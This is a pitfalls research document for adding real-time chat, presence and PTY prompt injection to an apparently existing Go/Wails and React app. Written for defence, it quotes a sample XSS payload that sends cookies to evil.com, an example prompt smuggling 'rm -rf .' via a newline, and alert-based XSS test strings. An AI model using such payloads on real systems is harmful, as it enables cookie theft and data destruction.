# Pitfalls Research

**Domain:** Adding real-time per-session chat (presence + message store + identity + PTY injection) to an existing Go/Wails + React app with a WebSocket relay and capability-token security model
**Researched:** 2026-06-25
**Confidence:** HIGH

---

## Critical Pitfalls

### Pitfall 1: RO Cap Holders Bypassing Read-Only via Chat Input

**What goes wrong:**
The relay already enforces `if !sub.ReadOnly` before forwarding keyboard input frames to PTY (MC-03 in `relay/server.go:269`). Chat is a new, separate input path. If a new "post chat message" handler checks only that a token is valid (not that it has write permission), a read-only capability-token holder can post messages — and if those messages are then processed for `@session` injection, they write to PTY stdin with no write cap check. The RO guarantee is silently broken by the new side channel.

**Why it happens:**
Developers add a `POST /api/chat` or a new WS message type and gate it on "is this a valid cap token for this session," assuming that's sufficient — matching how the relay's read-only viewer check works. But the relay's RO flag is set per-connection at upgrade time based on the `readonly=1` URL param; the new chat endpoint is a fresh request with its own access path, and it won't inherit that flag automatically.

**How to avoid:**
Define the capability requirement for chat posts up front and enforce it server-side on every path, not client-side:
- RO cap holders: read chat, cannot post. Enforce by checking `!sub.ReadOnly` (or an equivalent `chat.write` perm) before the daemon processes any incoming chat message, not just `@session` ones.
- `@session` injection: enforce a second, explicit check that the posting client's cap token carries write permission (not just read) before the daemon calls `session.Write()`. Do this in the daemon handler, not in the relay fan-out.
- Never rely on the frontend to suppress the "Send" button for RO viewers as the only guard.

**Warning signs:**
Any code path that calls `session.Write()` from chat processing without first consulting the cap token's perms. Grep for `session.Write` and `pty.Write` call sites added during the chat phase.

**Phase to address:** Daemon message store + chat protocol phase (first phase); verify in the security hardening phase.

---

### Pitfall 2: Control Characters and Embedded Newlines in `@session` PTY Injection

**What goes wrong:**
`@session` writes the message body directly to PTY stdin. A message that contains `\n`, `\r`, `\x03` (Ctrl-C), `\x04` (Ctrl-D / EOF), `\x1b[` (escape sequences), or `\x00` (null) does not land as a single agent prompt — it submits partial text and then sends additional commands, terminates the session, or corrupts the terminal state. An attacker sending `do X\nrm -rf .` gets two PTY writes: the prompt and a shell command.

**Why it happens:**
PTY stdin injection already exists (it is what keyboard input does), and the code path (`session.Write()` in `internal/pty/session.go`) takes raw bytes. There is currently no sanitization layer because keyboard input is expected to contain any character. The `@session` path is new and will call the same `Write` with user-supplied string content.

**How to avoid:**
Before writing to PTY, pass the message through a sanitizer that:
1. Strips all C0 control characters (`\x00`–`\x1f`) except printable whitespace (space, tab).
2. Collapses embedded newlines (`\n`, `\r`, `\r\n`) to a single space or rejects them entirely.
3. Appends exactly one `\n` at the end to submit the prompt.
4. Strips C1 controls and full CSI/OSC escape sequences (`\x1b[...`, `\x9b`, etc.) to prevent terminal manipulation.

Apply this sanitizer in the daemon handler for `@session`, not in the relay or the UI.

**Warning signs:**
Any `@session` code path that passes user string content to `session.Write()` without an intermediate sanitize step. Also: integration tests that only test happy-path single-word messages and never include newlines or control chars.

**Phase to address:** `@session` bridge implementation phase; explicit security test in the security hardening phase.

---

### Pitfall 3: Alias Spoofing / Identity Impersonation

**What goes wrong:**
Aliases are self-chosen and not globally unique. Alice picks the alias "bob" and all other participants see "bob" in the chat; they assume it is Bob. If the UI shows only the alias and not the underlying tailnet peer identity (node ID / MagicDNS hostname), impersonation is trivially easy. This is compounded if the server uses the alias as a key anywhere (e.g., `@alias` mention routing keyed on alias string rather than peer ID).

**Why it happens:**
The design says "tailnet ID + self-chosen alias, both visible" — but under deadline pressure the implementation shows only the alias (the friendly label) and hides the peer ID behind a tooltip or hover, which most users never see. Mentions are then wired to alias strings because that is what appears in the UI.

**How to avoid:**
- Server-side: the message payload always carries `{peer_id, alias, message}` where `peer_id` is the authoritative identity. The alias is display-only metadata, never used for access control or mention routing.
- UI: show the MagicDNS hostname or last-4 of the peer ID alongside the alias at all times (not just on hover), matching how Tailscale's own admin console works.
- Alias uniqueness: reject alias registration if an already-connected participant in the same session has the same alias (server-side, checked at join time, not just at first message).
- `@alias` mention routing: resolve mentions to peer IDs at send time; the unresolved alias string is never authoritative.

**Warning signs:**
Any code that branches on `alias == "owner"` or `alias == someKnownName`. Any mention system that stores `@alice` as the reference instead of `@peer:100.x.y.z`. Any UI that shows `alias` in the author column without a secondary identity indicator.

**Phase to address:** Identity + alias layer phase; revisit in cross-surface parity phase.

---

### Pitfall 4: XSS via Markdown Rendering on the Web Surface

**What goes wrong:**
Chat messages are rendered as Markdown on the web-share browser surface. If `rehype-raw` is enabled (or any HTML pass-through plugin), an attacker sends `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` and gets XSS in every other participant's browser tab. The existing file browser already explicitly excluded `rehype-raw` for this reason (Phase 120).

**Why it happens:**
Developers reach for `react-markdown` with `rehype-raw` because it makes rich content rendering trivially easy. The risk is easy to miss in code review because it looks like an innocent plugin option.

**How to avoid:**
Use `react-markdown` with `remark-gfm` only — exactly the same config as the file browser tab. Never add `rehype-raw` or `rehype-sanitize` (the latter is a workaround for the former; the correct answer is never enabling HTML pass-through). The project's existing strict CSP (`script-src 'self'`) provides defense-in-depth but is not a substitute for disabling HTML pass-through at the renderer.

**Warning signs:**
`rehype-raw` appearing in any chat component import. A Markdown renderer that allows `<script>`, `<iframe>`, or `on*` event attributes in its output (test by rendering `<img src=x onerror=alert(1)>` as a chat message and checking the DOM).

**Phase to address:** Chat UI implementation phase; verify in the cross-browser security gate.

---

### Pitfall 5: `@session` Bridge Implemented as a Wails RPC Instead of a Relay Message

**What goes wrong:**
The desktop GUI owner can inject to PTY via a Wails RPC (direct Go call). If `@session` is wired as `window.go.App.InjectToPTY(message)` on the desktop surface, it works for the GUI owner but silently does nothing on the web-share surface (no Wails runtime available). Web participants see the `@session` message appear in chat but the agent never receives the prompt. Cross-surface parity is broken — this is a release blocker per the project rule.

**Why it happens:**
The desktop GUI developer writes the first working implementation using the Wails IPC layer because it is the simplest path. The web surface is tested last and the parity gap only surfaces in UAT.

**How to avoid:**
Implement `@session` injection as a daemon-side handler triggered by a new relay WebSocket message type (e.g., `{type: "chat_inject", body: "..."}`). Both GUI and web surfaces send the same relay message; the daemon receives it and calls `session.Write()` after sanitization and cap check. The GUI should use the same WebSocket relay connection that web viewers use, not a Wails RPC, so a single code path serves both surfaces.

**Warning signs:**
A Wails binding `InjectToPTY` or similar appearing in `app.go` during the @session phase. Any path where the `@session` action is wired differently between desktop and web React components — or worse, two separate panel files with divergent logic.

**Phase to address:** `@session` bridge implementation phase; verified by cross-surface parity testing.

---

### Pitfall 6: Reconnect / Resync Producing Duplicate Messages

**What goes wrong:**
A client drops its WebSocket connection and rejoins. The daemon replays the full message history. If the client has no stable message IDs, or if the history replay is delivered over the same live stream without a clear boundary, messages the client already displayed appear again. Alternatively: if the daemon assigns sequence numbers that reset on restart (autoincrement counter starting at 1), a late joiner after a daemon restart cannot tell old messages from new ones and may display them twice.

**Why it happens:**
Message IDs are added late (treated as a log implementation detail) and the client reconciliation logic is never written because "it worked fine in the happy path." The reconnect path is only tested with an empty history.

**How to avoid:**
- Assign stable UUIDs or a `session_id + monotonic_seq` pair to every message at storage time.
- Deliver full history via a dedicated REST endpoint (`GET /api/chat/{sid}/history`) before opening the live delta stream; the WebSocket only carries deltas after the client's highest-known seq.
- Client reconciles by ID: if a message ID already exists in local state, skip it. This makes the live path and history path idempotent.

**Warning signs:**
Any message store that uses an `int` sequence that starts at 0 each time the daemon starts. Any client that appends messages from the history replay directly to the live stream without deduplication.

**Phase to address:** Daemon message store phase.

---

### Pitfall 7: Local Owner vs Same-Machine Web Client Have No Distinguishable Identity

**What goes wrong:**
The discovery note explicitly flags this: "the local owner and same-machine web clients aren't distinct tailnet peers." The web-share server is bound to the Tailscale IP; but the Wails-embedded webview (`wails.localhost`) connects via a loopback bridge, and a user who opens the web-share URL in their local Chrome also connects from the same machine. Neither has a distinct tailnet peer ID. Without a disambiguation rule, both appear as the same participant (or as "unknown"), leading to a single presence entry for what are actually two separate human interactions.

**Why it happens:**
Identity resolution is deferred to a later phase. When the chat UI is built, the developer tests only with the GUI owner connected, and presence looks correct. The edge case only appears during cross-surface UAT with two tabs open.

**How to avoid:**
Define the disambiguation rule before implementation:
- The Wails-embedded webview gets an "owner" identity flag injected at Wails startup (e.g., a unique session token passed as a URL fragment or an env variable the Go backend passes at connect time) that marks it as the GUI owner.
- A local-machine browser connection gets its identity from the cap token it presents; if it has the same tailnet peer ID as the owner, give it an "owner (web)" display label with the same peer ID — they are the same human, different clients.
- Never use IP address as the disambiguator; loopback and tailnet IPs can overlap.

**Warning signs:**
The identity resolution function returning `"unknown"` or an empty string for any connected client. Presence list showing only one entry when both the GUI and a local browser tab are connected.

**Phase to address:** Identity + alias layer phase.

---

### Pitfall 8: Unbounded Message Store Growth

**What goes wrong:**
The daemon accumulates all chat messages for every session in an append-only store with no eviction or cap. A session that runs for 8 hours with 10 active participants generates tens of thousands of messages. On daemon restart or late joiner, the full history is serialized and transmitted, causing latency spikes. Over time the store grows across all sessions indefinitely.

**Why it happens:**
Persistence is built correctly (file-backed, survives restart) but the cleanup policies are deferred: "we'll add eviction later." Later never comes.

**How to avoid:**
- Define a hard per-session cap (e.g., 10 000 messages) at implementation time. When the cap is hit, the oldest messages are evicted from the hot store; the Markdown export is recommended as a way to preserve history before eviction.
- The store's `AppendMessage` function enforces the cap atomically — it is not a later cleanup job.
- Session deletion calls a `DeleteThread(sessionID)` function that removes the entire thread from the store atomically, not lazily.

**Warning signs:**
An `AppendMessage` implementation with no cap check. Any store design that relies on a background goroutine to clean up old messages (race between cleanup and access).

**Phase to address:** Daemon message store phase.

---

### Pitfall 9: Stale Typing Indicators After Client Disconnect

**What goes wrong:**
A participant starts typing and the relay broadcasts a "typing" presence event to all other clients. The participant's connection drops before they send a "stopped typing" event. Other participants see the typing indicator persist indefinitely, creating confusion about whether the agent or a human is working.

**Why it happens:**
"Stopped typing" events are sent client-side on inactivity timeout (standard approach), but client-side timers don't fire on abrupt disconnects. The relay's existing close/leave event fires on disconnect but has no knowledge of per-client typing state.

**How to avoid:**
- Server-side TTL: when the daemon receives a "typing" event from a client, record it with a timestamp and set it to auto-expire after 5 seconds. If no new "typing" event arrives within that window, the daemon broadcasts a "stopped typing" event for that client.
- On WebSocket close (already fired in the relay), the daemon clears any active typing state for that subscriber and broadcasts the cleared state.
- The client-side timer is still useful for normal UX but is not the sole guard.

**Warning signs:**
A typing indicator state machine with no server-side TTL. Any test of presence that does not include a "disconnect mid-typing" scenario.

**Phase to address:** Real-time presence phase.

---

### Pitfall 10: Presence Flooding the Relay

**What goes wrong:**
Typing indicators triggered on every keypress create O(keystrokes * subscribers) relay messages per second. With 3 active typists and 5 subscribers, a sustained typing session generates 15+ relay messages per second just for presence, on top of terminal output. This saturates the relay's fan-out goroutines, causes jank in terminal rendering (same goroutine pool), and spikes daemon CPU.

**Why it happens:**
Typing event emission is wired directly to the `onInput` or `onChange` handler of the chat input field, which fires on every keystroke.

**How to avoid:**
- Client-side: throttle "typing" event emission to at most one per 500ms using a leading-edge throttle (first keypress sends immediately; subsequent keystrokes within the window are suppressed).
- Server-side: rate-limit "typing" messages per subscriber per session to N per second (e.g., 2); excess messages are dropped silently.
- Presence events use a separate low-priority relay path from terminal output, or at minimum are tagged so the relay can drop them under load rather than dropping terminal bytes.

**Warning signs:**
Typing indicator wired to the raw `onChange` handler. Relay fan-out latency increasing during active typing in load tests.

**Phase to address:** Real-time presence phase.

---

### Pitfall 11: Concurrent Write Races in the Daemon Message Store

**What goes wrong:**
Two web clients post chat messages simultaneously. If the daemon's message store is a `[]ChatMessage` slice in a struct field, concurrent appends without a mutex cause a data race (slice header corruption) or missed messages. The Go race detector will catch this in CI if the test exercises concurrent posts, but if the test only sends messages serially, the race silently ships to production.

**Why it happens:**
The store is prototyped with a struct field and no synchronization because unit tests always send one message at a time. The race only appears under concurrent load.

**How to avoid:**
- Protect the store with a `sync.Mutex` or use a channel-based serializer (single writer goroutine). The relay hub already uses a pattern like this for subscriber management — replicate it.
- Add a concurrent-write test that posts messages from multiple goroutines simultaneously and verifies all messages are persisted without data loss. Run this test under `-race`.

**Warning signs:**
A `ChatStore` or similar struct with `[]ChatMessage` or `map[string][]ChatMessage` fields and no mutex. Any store test that only sends messages from a single goroutine.

**Phase to address:** Daemon message store phase; CI race detector already runs on all platforms (continue to enforce).

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| In-memory `[]Message` map in daemon | No persistence plumbing needed at first | Lost on daemon restart; late joiners get empty chat — violates the stated feature contract | Never |
| Client-side `@session` suppression for RO users | No backend work needed | RO user who crafts a raw WS message bypasses it trivially | Never |
| Single component with `if (isWails)` branches for chat | Avoids designing a relay-message protocol | Grows into an unauditable tangle; parity gaps accumulate invisibly | Never |
| Alias-only identity (hide peer ID) | Cleaner UI | Impersonation trivial; mention routing breaks | Never |
| Polling for presence instead of relay push | No relay changes needed | O(clients * poll_rate) flood on daemon; presence latency feels sluggish | Acceptable only as a 1-day spike to validate UI layout before relay is wired |
| Unbounded store with no eviction | Simpler store implementation | Long-running session accumulates messages indefinitely | Acceptable for MVP only if a hard cap is added as a failing test from day one |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Existing relay fan-out | Adding new chat message types without going through the existing cap-check middleware | Reuse the relay's existing cap-check and origin-check; add chat message types as new subtypes within the same WS upgrade path, not a parallel endpoint |
| PTY `session.Write()` | Calling it directly from a new goroutine; `engine.go:474` documents this races with go-pty's internal write | Route all `@session` writes through the same serialized channel the relay read-pump uses |
| Tailscale `WhoIs` for peer identity | Calling `WhoIs` on every incoming chat message (expensive IPC per message) | Resolve peer identity once at WebSocket connect time; stamp it on the subscriber struct; copy it to every message at storage time |
| `react-markdown` | Using an older version where `allowDangerousHtml` defaults to `true` | Pin `react-markdown >= 10.1.0` (same as FileBrowserTab); confirm `allowDangerousHtml` is `false` |
| `capability.HasPerm` | Using `strings.Contains(perms, "write")` instead | Always use `capability.HasPerm()` — whole-token comma-split; `strings.Contains` false-positives on `"no-write"` |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Typing indicator on every keypress fanned to all subscribers | Terminal output jank; relay goroutine CPU spike during active typing | Client-side 500ms leading-edge throttle; server-side 2/sec rate limit per subscriber | Any session with 3+ active typists |
| Full history replay over live WS stream on reconnect | Reconnecting client causes N-message burst on relay | Deliver history via REST before opening the live delta WS | 200+ messages in thread |
| Storing messages in daemon RAM (`[]ChatMessage` per session, no eviction) | Daemon memory grows proportionally to session age; serialization latency on late join | File-backed store (append log or SQLite) with hard per-session cap | Sessions active for more than a few hours |
| Synchronous PTY write in the WS message handler | Relay read-pump blocked if agent is slow to consume stdin | Run PTY write in a goroutine with timeout; return ack to sender immediately | Any session where agent is slow to consume stdin |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Checking only token validity (not perms) before allowing chat post | RO viewer can post; RO viewer can inject via @session | Check `!sub.ReadOnly` and require write perm before any chat POST or @session injection |
| Storing raw alias as the author identity field | Alias changes mid-session; historical messages mis-attributed | Store `{peer_id, alias_at_send_time}` — peer ID is immutable; alias is a snapshot label |
| Reflecting alias to all clients without server-side length/character check | Long alias or HTML in alias corrupts UI layout; XSS vector in alias column | Validate alias at join: max 32 chars, printable text, no HTML special chars; reject at handshake |
| Logging message body at INFO level | Chat content (potentially sensitive) leaks to log files visible to any process with file access | Log metadata only (peer_id, session_id, seq, timestamp, byte length); never log the body |
| Using the `client=` URL query param as the chat sender identity | That field is currently unvalidated free-text, 64-char truncated, trivially spoofed | Ignore `client=` for identity; use the tailnet peer ID resolved from `WhoIs` at connect time |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Chat panel in a persistent sidebar column | Terminal real estate lost for all sessions, even those with no chat activity | Mount as a collapsible drawer within the session modal; collapsed by default; badge on trigger when new messages arrive |
| Typing indicator indistinguishable from agent activity indicator | Users mistake human-typing indicator for agent response indicator | Use visually distinct "humans typing" indicator; different icon and label from the agent's running/waiting status dots |
| `@session` sends immediately on Enter with no confirmation | A mistyped message irrecoverably pollutes the agent's context | Show an inline "Injecting to agent…" pre-send preview; require a deliberate second confirmation or a 500ms hold to prevent accidents |
| Markdown export is a flat dump with no metadata | Long sessions are hard to parse | Export header includes: session name, agent, date range, participant list; then chronological messages with timestamps |

---

## "Looks Done But Isn't" Checklist

- [ ] **RO enforcement:** RO cap token holder cannot send a chat message — verify by crafting a WebSocket frame from an RO-capped connection and confirming the daemon rejects it (non-2xx or WS error frame).
- [ ] **`@session` sanitization:** A message body containing `\nhello\nworld` via @session results in exactly one PTY write terminated by one `\n` — verify by inspecting raw PTY stdin bytes received.
- [ ] **Daemon restart survival:** Post 5 messages, kill and restart the daemon, reconnect — verify all 5 messages appear in the history replay.
- [ ] **Session delete teardown:** Delete a session that has an active chat thread — verify no chat data remains in the store (no orphaned thread).
- [ ] **Alias uniqueness enforcement:** Two clients attempt to join with the same alias in the same session — verify the second is rejected or receives an auto-suffixed alias.
- [ ] **Web surface @session:** From a web-share browser (not the Wails GUI), send a `@session` message — verify the agent's PTY receives the injected prompt.
- [ ] **Typing indicator cleanup on disconnect:** Drop a client's WebSocket connection mid-typing — verify the "typing" indicator clears within 6 seconds on all remaining clients without any explicit "stopped typing" event.
- [ ] **Markdown XSS:** Post `<img src=x onerror=alert('xss')>` as a chat message on the web-share surface — verify no alert fires and the rendered DOM has no `onerror` attribute; CSP violation count = 0.
- [ ] **Cross-surface presence:** One GUI participant + one web-share browser participant — verify both see each other's presence and typing indicators simultaneously.
- [ ] **History deduplication on reconnect:** Drop and rejoin the WebSocket mid-session — verify no messages appear twice in the chat panel.

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| RO bypass shipped to production | HIGH | Hotfix: add cap check to chat POST handler server-side; audit recent chat logs for injected content; release patch immediately |
| In-memory store shipped without persistence | MEDIUM | Add file-backed store; dual-write transition period to avoid losing in-flight sessions |
| PTY control-char injection discovered post-ship | HIGH | Hotfix sanitizer; communicate to affected session owners; no recovery for already-injected PTY content |
| Orphaned threads after session delete | LOW | One-time cleanup: scan store for thread IDs with no matching session ID; delete orphans |
| Typing flooding under load | MEDIUM | Server-side rate limiter on presence messages (config change, no schema migration needed) |
| Stale typing indicator after disconnect | LOW | Add server-side TTL to typing state; relay close event wiring already exists |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| RO cap bypass via chat / @session | Daemon message store + chat protocol | Automated: RO-capped WS tries to POST chat → reject; tries @session → no PTY write |
| PTY control-char injection | @session bridge | Automated: sanitizer unit tests with newline/ctrl-char corpus; integration test confirms single terminated line |
| Alias spoofing | Identity + alias layer | Automated: two clients attempt same alias → second rejected; message payload always carries peer_id |
| XSS via Markdown | Chat UI implementation | Cross-browser Playwright: render `<img onerror=...>` → DOM has no onerror attr; CSP violations = 0 |
| @session bridge surface divergence (Wails vs relay) | @session bridge | Cross-surface UAT: web-share browser @session → PTY receives prompt |
| Presence / typing flooding | Real-time presence | Load test: 3 concurrent typists → relay message rate stays under defined threshold |
| Reconnect duplication | Daemon message store | Automated: drop and rejoin WS → messages appear exactly once; stable IDs verified |
| Unbounded store growth | Daemon message store | Unit test: store evicts oldest messages when hard cap is reached |
| Session delete orphan | Daemon message store | Automated: create session + chat, delete session, confirm store has no entry for that session ID |
| Daemon restart data loss | Daemon message store | Integration test: write messages, restart daemon, read messages → same content |
| Local owner vs same-machine web client | Identity + alias layer | Manual UAT: GUI owner + web-share in same machine browser → two distinct presence entries |
| @session not wired on web surface | Cross-surface parity + testing | Playwright on web-share surface: @session message → PTY write confirmed |
| Chat UI feature drift between surfaces | Cross-surface parity + testing | Playwright e2e covers both Wails webview bridge and standalone web-share browser for all chat features |

---

## Sources

- `internal/relay/server.go` — ReadOnly enforcement at line 269 (MC-03); client identity cap at line 954
- `internal/capability/capability.go` — `HasPerm()` whole-token split; `PermFilesRead`/`PermFilesWrite` constants; substring-false-positive risk documented inline
- `internal/pty/session.go` — `session.Write()` raw PTY stdin path (no sanitization layer)
- `internal/relay/hub.go` — subscriber `ReadOnly` field
- `internal/webserver/server.go` — tailnet-only bind model; origin allowlist; `WhoIs` resolution pattern
- `internal/daemon/engine.go:474` — race warning on concurrent PTY writes
- `.planning/notes/session-chat-discovery.md` — agreed design, one-way bridge, out-of-scope decisions
- `.planning/PROJECT.md` — v3.1 cap-token model history; Phase 120 `rehype-raw` XSS decision; cross-surface parity rule; MC-03 RO relay enforcement
- Project precedent: `react-markdown` + `remark-gfm` only (NO `rehype-raw`) established Phase 120 FileBrowserTab

---
*Pitfalls research for: AgentHub v4.1 Session Chat — adding real-time chat + presence + message store + identity to an existing relay/PTY/cap-token system*
*Researched: 2026-06-25*
